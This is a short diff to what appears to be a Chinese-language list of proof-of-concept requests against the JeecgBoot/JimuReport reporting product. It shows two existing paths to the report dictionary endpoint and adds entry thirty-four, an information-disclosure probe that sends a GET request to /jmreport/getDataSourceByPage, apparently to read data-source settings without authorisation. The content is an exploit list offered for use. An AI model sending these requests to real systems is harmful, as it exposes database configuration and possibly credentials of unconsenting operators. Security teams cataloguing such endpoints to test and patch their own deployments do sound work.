@@ -325,3 +325,8 @@ poc1:
 /jmreport/dict/list?pageSize=200&pageNo=1
 poc2:
 /jeecg-boot/jmreport/dict/list?pageSize=200&pageNo=1
+
+三十四、getDataSourceByPage敏感信息泄露
+GET /jmreport/getDataSourceByPage
+
+
